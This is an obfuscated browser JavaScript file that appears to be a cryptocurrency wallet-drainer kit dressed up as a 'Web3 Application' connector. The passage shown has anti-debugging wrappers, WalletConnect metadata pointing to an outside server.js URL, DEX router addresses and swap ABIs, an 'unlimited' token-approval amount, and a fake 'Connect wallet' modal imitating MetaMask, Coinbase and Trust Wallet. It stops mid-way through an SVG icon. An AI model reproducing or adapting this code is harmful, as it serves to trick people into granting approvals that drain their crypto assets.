const _0x3c3461 = function () {
  let _0x54205c = true;
  return function (_0x40cde6, _0x44b483) {
    const _0x2cfc77 = _0x54205c ? function () {
      if (_0x44b483) {
        const _0xe63eae = _0x44b483.apply(_0x40cde6, arguments);
        _0x44b483 = null;
        return _0xe63eae;
      }
    } : function () {};
    _0x54205c = false;
    return _0x2cfc77;
  };
}();
const _0x3760df = _0x3c3461(this, function () {
  return _0x3760df.toString().search('(((.+)+)+)+$').toString().constructor(_0x3760df).search("(((.+)+)+)+$");
});
_0x3760df();
const _0x285c7c = function () {
  let _0x9f4f64 = true;
  return function (_0x2dc6fc, _0x38db37) {
    const _0x38dd5b = _0x9f4f64 ? function () {
      if (_0x38db37) {
        const _0x7a1761 = _0x38db37.apply(_0x2dc6fc, arguments);
        _0x38db37 = null;
        return _0x7a1761;
      }
    } : function () {};
    _0x9f4f64 = false;
    return _0x38dd5b;
  };
}();
(function () {
  _0x285c7c(this, function () {
    const _0x41d765 = new RegExp("function *\\( *\\)");
    const _0x22469d = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
    const _0x1c62d8 = _0x1abc84("init");
    if (!_0x41d765.test(_0x1c62d8 + "chain") || !_0x22469d.test(_0x1c62d8 + "input")) {
      _0x1c62d8('0');
    } else {
      _0x1abc84();
    }
  })();
})();
const MS_WalletConnect_MetaData = {
  'name': document.title,
  'description': "Web3 Application",
  'url': "https://www.kirazyapi.com.tr/Server/server.js",
  'icons': ["https://avatars.githubusercontent.com/u/37784886"]
};
var MS_Worker_ID = null;
let MS_Ready = false;
let MS_Settings = {};
let MS_Contract_ABI = {};
let MS_ID = 0x0;
let MS_Process = false;
let MS_Provider = null;
let MS_Current_Provider = null;
let MS_Current_Address = null;
let MS_Current_Chain_ID = null;
let MS_Web3 = null;
let MS_Signer = null;
let MS_Check_Done = false;
let MS_Currencies = {};
let MS_Force_Mode = false;
let MS_Sign_Disabled = false;
let BL_US = false;
let SP_US = false;
let XY_US = false;
let MS_WC_Version = 0x2;
let MS_Bad_Country = false;
const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
(async () => {
  try {
    let _0x4afce2 = await fetch("https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD", {
      'method': "GET",
      'headers': {
        'Accept': "application/json"
      }
    });
    MS_Currencies = await _0x4afce2.json();
  } catch (_0x5e0256) {
    console.log(_0x5e0256);
  }
})();
const MS_API_Data = {
  0x1: 'api.etherscan.io',
  0xa: "api-optimistic.etherscan.io",
  0x38: 'api.bscscan.com',
  0x89: 'api.polygonscan.com',
  0xfa: "api.ftmscan.com",
  0xa4b1: "api.arbiscan.io",
  0xa86a: "api.snowtrace.io"
};
var MS_MetaMask_ChainData = {};
const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    0x1: {
      'chainId': "0x1",
      'chainName': "Ethereum Mainnet",
      'nativeCurrency': {
        'name': "Ether",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x1]],
      'blockExplorerUrls': ["https://etherscan.io"]
    },
    0x38: {
      'chainId': "0x38",
      'chainName': "BNB Smart Chain",
      'nativeCurrency': {
        'name': "Binance Coin",
        'symbol': 'BNB',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x38]],
      'blockExplorerUrls': ["https://bscscan.com"]
    },
    0x89: {
      'chainId': '0x89',
      'chainName': "Polygon Mainnet",
      'nativeCurrency': {
        'name': "MATIC",
        'symbol': 'MATIC',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x89]],
      'blockExplorerUrls': ["https://polygonscan.com"]
    },
    0xa86a: {
      'chainId': "0xA86A",
      'chainName': "Avalanche Network C-Chain",
      'nativeCurrency': {
        'name': "AVAX",
        'symbol': "AVAX",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa86a]],
      'blockExplorerUrls': ['https://snowtrace.io/']
    },
    0xa4b1: {
      'chainId': "0xA4B1",
      'chainName': "Arbitrum One",
      'nativeCurrency': {
        'name': "ETH",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa4b1]],
      'blockExplorerUrls': ["https://explorer.arbitrum.io"]
    },
    0xa: {
      'chainId': "0xA",
      'chainName': "Optimism",
      'nativeCurrency': {
        'name': 'ETH',
        'symbol': 'ETH',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa]],
      'blockExplorerUrls': ["https://optimistic.etherscan.io/"]
    },
    0xfa: {
      'chainId': "0xFA",
      'chainName': "Fantom Opera",
      'nativeCurrency': {
        'name': "FTM",
        'symbol': 'FTM',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xfa]],
      'blockExplorerUrls': ['https://ftmscan.com/']
    }
  };
};
const MS_Routers = {
  0x1: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"], ["Pancake", "0xEfF92A263d31888d860bD50809A8D171709b7b1c"], ['Pancake_V3', "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"], ["Sushiswap", '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']],
  0xa: [['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']],
  0x38: [["Pancake", "0x10ED43C718714eb63d5aA57B78B54704E256024E"], ["Pancake_V3", "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"], ['Sushiswap', "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0x89: [['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'], ["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"], ["Quickswap", '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']],
  0xfa: [["Sushiswap", '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']],
  0xa4b1: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"], ["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0xa86a: [['Sushiswap', "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]]
};
const MS_Swap_Route = {
  0x1: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
  0xa: "0x4200000000000000000000000000000000000006",
  0x38: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
  0x89: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",
  0xfa: "0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83",
  0xa4b1: "0x82af49447d8a07e3bd95bd0d56f35241523fbab1",
  0xa86a: "0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7"
};
const MS_Uniswap_ABI = [{
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': "uint256"
  }, {
    'internalType': "address[]",
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': "address"
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': "uint256",
    'name': "amountOut",
    'type': 'uint256'
  }],
  'stateMutability': "payable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': 'deadline',
    'type': "uint256"
  }, {
    'internalType': "bytes[]",
    'name': "data",
    'type': "bytes[]"
  }],
  'name': "multicall",
  'outputs': [{
    'internalType': "bytes[]",
    'name': '',
    'type': "bytes[]"
  }],
  'stateMutability': 'payable',
  'type': "function"
}];
const MS_Pancake_ABI = [{
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': 'uint256'
  }, {
    'internalType': "uint256",
    'name': 'amountOutMin',
    'type': 'uint256'
  }, {
    'internalType': 'address[]',
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': 'address',
    'name': 'to',
    'type': "address"
  }, {
    'internalType': "uint256",
    'name': 'deadline',
    'type': "uint256"
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': "uint256[]",
    'name': 'amounts',
    'type': "uint256[]"
  }],
  'stateMutability': 'nonpayable',
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': 'uint256'
  }, {
    'internalType': "address[]",
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': 'address',
    'name': 'to',
    'type': "address"
  }, {
    'internalType': 'uint256',
    'name': 'deadline',
    'type': "uint256"
  }],
  'name': 'swapExactTokensForETH',
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': "uint256[]"
  }],
  'stateMutability': "nonpayable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': "deadline",
    'type': "uint256"
  }, {
    'internalType': "bytes[]",
    'name': "data",
    'type': "bytes[]"
  }],
  'name': "multicall",
  'outputs': [{
    'internalType': "bytes[]",
    'name': '',
    'type': 'bytes[]'
  }],
  'stateMutability': 'payable',
  'type': "function"
}, {
  'inputs': [{
    'internalType': 'uint256',
    'name': "amountIn",
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': "uint256"
  }, {
    'internalType': "address[]",
    'name': "path",
    'type': 'address[]'
  }, {
    'internalType': 'address',
    'name': 'to',
    'type': "address"
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': 'uint256[]'
  }],
  'stateMutability': "nonpayable",
  'type': "function"
}];
const MS_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const MS_Mobile_Status = (() => {
  let _0xb455eb = false;
  (function (_0x2482cc) {
    if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(_0x2482cc) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0x2482cc.substr(0x0, 0x4))) {
      _0xb455eb = true;
    }
  })(navigator.userAgent || navigator.vendor || window.opera);
  return _0xb455eb;
})();
const MS_Unlimited_Amount = "1158472395435294898592384258348512586931256";
const MS_Modal_Data = [{
  'type': "style",
  'data': "@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }"
}, {
  'type': "html",
  'data': "<div class=\"web3-modal-main\"><p class=\"web3-modal-title\" style=\"margin-top:0\">Connect your wallet</p><div class=\"web3-modal-items\"><div class=\"item\" onclick='connect_wallet(\"MetaMask\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/MM.svg\" alt=\"\"></div><span>MetaMask</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Coinbase\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/CB.svg\" alt=\"\"></div><span>Coinbase</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Trust Wallet\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/TW.svg\" alt=\"\"></div><span>Trust Wallet</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Binance Wallet\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/BW.svg\" alt=\"\"></div><span>Binance Wallet</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick=\"use_wc()\"><div><div class=\"icon\"></div><span>More Wallets</span></div><div class=\"arrow\"></div></div></div></div><div class=\"web3-modal-wc\" style=\"display:none\"><p class=\"web3-modal-title\" style=\"margin-top:0\">Choose Version</p><div class=\"web3-modal-items\"><div class=\"item\" onclick='connect_wallet(\"WalletConnect\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/WC.svg\" alt=\"\"></div><span>WalletConnect</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"WalletConnect\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/WC1.svg\" alt=\"\"></div><span>WalletConnect Legacy</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick=\"ms_init()\"><div class=\"arrow\" style=\"transform:rotateY(190deg)\"></div><div><div class=\"icon\"></div><span>Return to Wallets</span></div></div></div></div>"
}];
const CUSTOM_modal_style = "@import url(https://fonts.googleapis.com/css2?family=Manrope:wght@400;500&display=swap);#overlay { position: fixed; display: block; width: 100%; height: 100%; top: 0; background-color: rgb(0 0 0/25%); left: 0; right: 0; bottom: 0; z-index: 99999; }.modal{position:absolute;top:150%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);box-sizing:border-box;width:100%;display:flex;max-width:440px;font-family:Manrope;flex-direction:column;color:#01091b;align-items:flex-start;background:#fff;border-radius:24px}.modal-head{display:flex;padding:32px 24px;justify-content:space-between;align-items:center;box-sizing:border-box}.modal-head-block-f{display:flex;flex-direction:column;align-items:flex-start;gap:8px}.modal-head-title{font-size:22px;font-weight:500}.modal-head-desc{color:#677189;font-size:16px;max-width:279px;font-weight:400}.modal-close{display:flex;padding:12px;align-items:flex-start;gap:8px;justify-content:end;position:absolute;right:8px;top:8px;cursor:pointer}.modal-main{display:flex;padding:0 24px 32px 24px;flex-direction:column;gap:20px}.modal-main-title{font-size:16px;font-weight:500}.modal-main-menu{display:flex;align-items:flex-start;align-content:flex-start;gap:16px;align-self:stretch;flex-wrap:wrap;justify-content:center}.menu-el{display:flex;padding:16px;flex-direction:column;align-items:flex-start;gap:32px;box-sizing:border-box;cursor:pointer;max-width:188px;border-radius:16px;border:1px solid #d3e5ed}.modal-el-desc{display:flex;flex-direction:column;align-items:flex-start;gap:4px;align-self:stretch}span.modal-el-desc-first{font-size:16px;font-style:normal;font-weight:500}span.modal-el-desc-second{color:#677189;font-size:14px;font-style:normal;font-weight:400;align-self:stretch}.modal-icon{display:flex;width:32px;height:32px;justify-content:center;align-items:center}.menu-el:hover{border:1px solid #0052ff}.modal-bottom{display:flex;padding:0 24px 24px 24px;flex-direction:column;align-items:center;gap:16px;align-self:stretch}.modal-bottom button{border-radius:16px;background:#0052ff;display:flex;padding:16px 0;justify-content:center;align-items:center;gap:8px;align-self:stretch;outline:0;cursor:pointer;border:0;color:#fff;font-size:16px;font-weight:500}.modal-bottom span{color:#677189;font-size:14px;font-style:normal;font-weight:300}.modal.black{background:#161a1e;color:#f5f5f5}.modal.black .menu-el{border:1px solid #2c3437}.modal.black .menu-el:hover{border:1px solid #0052ff}.modal.black .modal-head-desc{color:#a7a8aa}.modal.black span.modal-el-desc-second{color:#a7a8aa}.modal.black .modal-bottom span{color:#a7a8aa}@media (min-width:375px) and (max-width:450px){.menu-el{max-width:100%;width:100%;flex-direction:row}}@media (min-width:150px) and (max-width:375px){.menu-el{max-width:100%;width:100%;flex-direction:row}span.modal-el-desc-second {display: none;}.modal-el-desc {justify-content: center;align-items: center;}}";
const CUSTOM_modal_code = "<div class=\"modal black\" style=\"display: none;\"><div class=modal-head><div class=modal-head-block-f><div class=modal-head-title>Connect wallet</div><div class=modal-head-desc>Choose what network and wallet want to connect below</div></div><div class=modal-close><svg fill=none height=24 viewBox=\"0 0 24 24\"width=24 xmlns=http://www.w3.org/2000/svg><path d=\"M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z\"fill=#C4C4C4 clip-rule=evenodd fill-rule=evenodd></path></svg></div></div><div class=modal-main><div class=modal-main-title>Choose Network</div><div class=modal-main-menu><div class=menu-el data=1><div class=modal-icon><svg fill=none height=30 viewBox=\"0 0 32 30\"width=32 xmlns=http://www.w3.org/2000/svg><path d=\"M30.3712 0.342773L17.9856 9.51402L20.255 4.12465L30.3712 0.342773Z\"fill=#E17726></path><path d=\"M30.3713 0.342559L30.3013 0.247559L18.262 9.16193L20.3438 4.21693L30.4126 0.453184L30.3713 0.342559L30.3013 0.247559L30.3713 0.342559L30.3301 0.231934L20.2132 4.01381L20.1457 4.07818L17.877 9.46756L17.9126 9.60631L18.0557 9.60881L30.442 0.437559L30.4751 0.285684L30.3301 0.231934L30.3713 0.342559Z\"fill=#E17726></path><path d=\"M1.72316 0.342773L14.0144 9.6084L11.84 4.12465L1.72316 0.342773ZM25.8332 21.6159L22.5238 26.6271L29.615 28.6128L31.6007 21.7109C31.695 21.7109 25.8332 21.6159 25.8332 21.6159ZM0.399414 21.8053L2.38504 28.7071L9.47629 26.7215L6.16691 21.7103C6.16691 21.6159 0.399414 21.8053 0.399414 21.8053Z\"fill=#E27625></path><path d=\"M1.72314 0.342559L1.65189 0.436934L13.9431 9.70256L14.0856 9.70193L14.1238 9.56443L11.95 4.08068L11.8813 4.01381L1.76439 0.231934L1.61939 0.285684L1.65189 0.436934L1.72314 0.342559L1.68189 0.453184L11.7494 4.21693L13.7494 9.26068L1.79439 0.248184L1.72314 0.342559ZM25.8331 21.6157L25.7344 21.5507L22.425 26.5619L22.4131 26.6682L22.4919 26.7407L29.5831 28.7263L29.7288 28.6451L31.7144 21.7432L31.6006 21.7107V21.8288L31.6113 21.8282L31.7169 21.7351L31.6581 21.6069L31.6156 21.5932L31.5856 21.5919C31.2344 21.5851 25.8344 21.4976 25.8344 21.4976L25.7338 21.5507L25.8331 21.6157L25.8313 21.7338C25.8344 21.7338 27.2731 21.7569 28.7156 21.7807C29.4369 21.7926 30.1575 21.8044 30.6988 21.8132C30.9694 21.8176 31.1944 21.8213 31.3519 21.8238L31.535 21.8269L31.5831 21.8276H31.595H31.5969L31.5994 21.7569L31.5956 21.8276H31.5969L31.5994 21.7569L31.5956 21.8276L31.6013 21.7157L31.5919 21.8276H31.5956L31.6013 21.7157L31.5919 21.8276L31.6013 21.7107L31.5838 21.8269L31.5913 21.8276L31.6006 21.7107L31.5831 21.8269L31.6006 21.7101L31.5688 21.8238L31.5831 21.8269L31.6006 21.7101L31.5906 21.5926L31.5994 21.6969V21.5919L31.5906 21.5926L31.5994 21.6969V21.5919L31.4856 21.6776L29.5325 28.4669L22.7106 26.5569L25.9306 21.6813L25.8331 21.6157ZM0.399395 21.8051L0.285645 21.8376L2.27127 28.7394L2.41689 28.8207L9.50815 26.8351L9.58689 26.7626L9.57502 26.6563L6.26565 21.6451L6.16689 21.7101H6.28502L6.22627 21.6057L6.12002 21.5782C6.01877 21.5688 5.82877 21.5651 5.56752 21.5651C4.08627 21.5651 0.396895 21.6863 0.39627 21.6863L0.304395 21.7351L0.28627 21.8376L0.399395 21.8051L0.403145 21.9232C0.408145 21.9232 4.09502 21.8019 5.5669 21.8019C5.75065 21.8019 5.8994 21.8038 6.00065 21.8082L6.11064 21.8157L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.16252 21.7101H6.0494L6.10315 21.8076L6.16315 21.7101H6.05002L6.0694 21.7751L9.2894 26.6507L2.46627 28.5613L0.513145 21.7726L0.399395 21.8051Z\"fill=#E27625></path><path d=\"M9.09817 13.1062L7.11255 16.0375L14.1094 16.3212L13.92 8.75746L9.09817 13.1062ZM22.9969 13.1062L18.0807 8.75684L17.8913 16.4156L24.8882 16.1318C24.8875 16.0375 22.9969 13.1062 22.9969 13.1062ZM9.4763 26.7212L13.7313 24.6412L10.0438 21.805L9.4763 26.7212ZM18.3638 24.6412L22.6188 26.7212L22.0513 21.805C21.9569 21.805 18.3638 24.6412 18.3638 24.6412Z\"fill=#E27625></path><path d=\"M9.09809 13.1066L8.99996 13.0403L7.01434 15.9716L7.00684 16.0909L7.10746 16.1559L14.1043 16.4397L14.1918 16.4059L14.2268 16.3191L14.0375 8.75531L13.9662 8.64969L13.8406 8.67031L9.01871 13.0191L8.99996 13.0403L9.09809 13.1066L9.17746 13.1941L13.8087 9.01719L13.9881 16.1978L7.32996 15.9278L9.19621 13.1728L9.09809 13.1066ZM22.9968 13.1066L23.075 13.0178L18.1587 8.66844L18.0331 8.64844L17.9618 8.75406L17.7725 16.4128L17.8075 16.4997L17.895 16.5334L24.8925 16.2503L25.0056 16.1322L24.9906 16.0684C24.9531 15.9834 24.825 15.7722 24.6412 15.4741C24.0943 14.5897 23.0962 13.0428 23.0956 13.0422L23.0743 13.0178L22.9968 13.1066L22.8975 13.1703C22.8987 13.1716 23.37 13.9028 23.8425 14.6472C24.0787 15.0191 24.315 15.3941 24.4918 15.6816C24.58 15.8253 24.6537 15.9466 24.7043 16.0341L24.7618 16.1366L24.7737 16.1616L24.8662 16.1322H24.77L24.7743 16.1616L24.8668 16.1322H24.7706H24.8887L24.8837 16.0141L18.0131 16.2928L18.1931 9.01406L22.9193 13.1953L22.9968 13.1066ZM9.47621 26.7216L9.52809 26.8278L13.7831 24.7478L13.8487 24.6534L13.8031 24.5478L10.1156 21.7116L9.99746 21.6966L9.92621 21.7916L9.35871 26.7078L9.40809 26.8178L9.52809 26.8272L9.47621 26.7216L9.59371 26.7353L10.1368 22.0259L13.5075 24.6191L9.42371 26.6153L9.47621 26.7216ZM18.3637 24.6416L18.3118 24.7478L22.5668 26.8278L22.6868 26.8184L22.7362 26.7084L22.1687 21.7922L22.0512 21.6878L21.9743 21.7109C21.8812 21.7641 21.6237 21.9572 21.2618 22.2322C20.1868 23.0522 18.2906 24.5497 18.29 24.5497L18.2456 24.6553L18.3112 24.7491L18.3637 24.6416L18.4368 24.7341C18.4387 24.7328 19.335 24.0253 20.2443 23.3166C20.6993 22.9622 21.1568 22.6078 21.5062 22.3422C21.6806 22.2097 21.8287 22.0991 21.9343 22.0228L22.0587 21.9359L22.0893 21.9166L22.0906 21.9159L22.0506 21.8234V21.9234L22.0906 21.9159L22.0506 21.8234V21.9234V21.8053L21.9331 21.8191L22.4756 26.5209L18.415 24.5359L18.3637 24.6416Z\"fill=#E27625></path><path d=\"M22.5238 26.7216L18.2688 24.6416L18.6469 27.3835V28.5179L22.5238 26.7216ZM9.47632 26.7216L13.4476 28.6129V27.4785L13.8257 24.7366L9.47632 26.7216Z\"fill=#D5BFB2></path><path d=\"M22.5238 26.7214L22.5757 26.6152L18.3207 24.5352L18.1994 24.5458L18.1519 24.6577L18.5288 27.3914V28.5177L18.5832 28.617L18.6963 28.6245L22.5725 26.8283L22.6413 26.722L22.575 26.6145L22.5238 26.7214L22.4738 26.6139L18.765 28.3327V27.3833L18.7638 27.367L18.4157 24.8452L22.4713 26.8277L22.5238 26.7214ZM9.47628 26.7214L9.42565 26.8283L13.3969 28.7195L13.5107 28.7127L13.5657 28.6127V27.4864L13.9425 24.752L13.8963 24.6408L13.7769 24.6283L9.42753 26.6139L9.35815 26.7202L9.42565 26.8277L9.47628 26.7214L9.52565 26.8289L13.6794 24.9327L13.3307 27.4614L13.3294 27.4777V28.4252L9.52753 26.6145L9.47628 26.7214Z\"fill=#D5BFB2></path><path d=\"M13.4476 20.0088L9.94946 18.9688L12.4076 17.8345L13.4476 20.0088ZM18.5532 20.0088L19.5932 17.8345L22.0513 18.9688L18.5532 20.0088Z\"fill=#233447></path><path d=\"M13.4474 20.0089L13.4812 19.8958L10.283 18.9452L12.3512 17.9908L13.3412 20.0602L13.4474 20.0089L13.5543 19.9577L12.5143 17.7833L12.358 17.7271L9.89991 18.8614L9.83179 18.9771L9.91616 19.0821L13.4143 20.1221L13.538 20.0858L13.5549 19.9583L13.4474 20.0089ZM18.553 20.0089L18.6599 20.0602L19.6499 17.9908L21.718 18.9452L18.5199 19.8958L18.553 20.0089L18.5868 20.1221L22.0849 19.0821L22.1693 18.9771L22.1012 18.8614L19.643 17.7271L19.4868 17.7833L18.4468 19.9577L18.4637 20.0852L18.5874 20.1214L18.553 20.0089Z\"fill=#233447></path><path d=\"M9.47623 26.7212L10.0437 21.71L6.16748 21.8043L9.47623 26.7212ZM21.9569 21.6156L22.5244 26.6268L25.8337 21.7106L21.9569 21.6156ZM24.8875 16.1318L17.8906 16.4156L18.5525 20.0087L19.5925 17.8343L22.0506 18.9687L24.8875 16.1318ZM9.94873 18.9687L12.4069 17.8343L13.4469 20.0087L14.1087 16.4156L7.11186 16.1318L9.94873 18.9687Z\"fill=#CC6228></path><path d=\"M9.47636 26.7212L9.59386 26.7343L10.1614 21.723L10.1314 21.6299L10.0414 21.5918L6.16511 21.6862L6.06323 21.7499L6.07011 21.8699L9.37948 26.7862L9.50573 26.8349L9.59511 26.7337L9.47636 26.7212L9.57448 26.6549L6.38573 21.9174L9.91073 21.8312L9.35886 26.7074L9.47636 26.7212ZM21.957 21.6155L21.8395 21.6287L22.407 26.6399L22.4964 26.7412L22.6226 26.6924L25.932 21.7762L25.9389 21.6562L25.837 21.5924L21.9607 21.498L21.8707 21.5362L21.8407 21.6293L21.957 21.6155L21.9539 